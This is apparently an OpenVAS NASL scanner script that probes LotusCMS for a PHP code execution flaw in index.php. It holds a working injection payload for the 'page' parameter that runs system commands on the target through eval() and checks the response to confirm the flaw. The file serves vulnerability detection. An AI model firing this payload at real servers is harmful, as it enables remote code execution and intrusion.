##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_lotuscms_php_code_exec_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# LotusCMS PHP Code Execution Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to obtain some sensitive
  information or execute arbitrary code on the vulnerable Web server.
  Impact Level: Application";

tag_affected = "LotusCMS version 3.03, 3.04 and other versions may also be affected.";
tag_insight = "Input passed via the 'req' and 'page' parameters to index.php is not
  properly sanitised in the 'Router()' function in core/lib/router.php
  before being used in an 'eval()' call.";
tag_solution = "No solution or patch is available as of 27th june, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://sourceforge.net/projects/arboroiancms";
tag_summary = "This host is running LotusCMS and is prone to php code execution
  vulnerability.";

if(description)
{
  script_id(903312);
  script_version("$Revision: 11 $");
  script_bugtraq_id(52349);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-06-27 14:55:42 +0530 (Thu, 27 Jun 2013)");
  script_name("LotusCMS PHP Code Execution Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_description(desc);
  script_xref(name : "URL" , value : "http://www.osvdb.org/75095");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/43682");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18565");
  script_xref(name : "URL" , value : "http://secunia.com/secunia_research/2011-21");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/122161/lotus_eval.py.txt");
  script_xref(name : "URL" , value : "http://metasploit.org/modules/exploit/multi/http/lcms_php_exec");
  script_summary("Check if LotusCMS is vulnerable to php code execution");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("url_func.inc");
include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
port = 0;
dir = "";
url = "";
cmds = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Iterate over possible paths
foreach dir (make_list("", "/lcms", "/cms", cgi_dirs()))
{
  ## Confirm the application
  if(http_vuln_check(port:port, url:string(dir,"/index.php"), check_header:TRUE,
                    pattern:"LotusCMS<", extra_check:"MSS<"))
  {
    cmds = exploit_commands();

    foreach cmd (keys(cmds))
    {
      _cmd = base64(str:cmds[cmd]);
      en_cmd = base64(str:_cmd);
      url_en_cmd = urlencode(str:en_cmd);

      ## Construct attack request
      url = dir + "/index.php?page=index%27)%3B%24%7Bsystem(base64_decode" +
            "(base64_decode(%27"+ url_en_cmd + "%27)))%7D%3B%23";

      ## Try attack and check the response to confirm vulnerability
      if(http_vuln_check(port:port, url:url, check_header:TRUE,
         pattern:cmd))
      {
        security_hole(port);
        exit(0);
      }
    }
  }
}
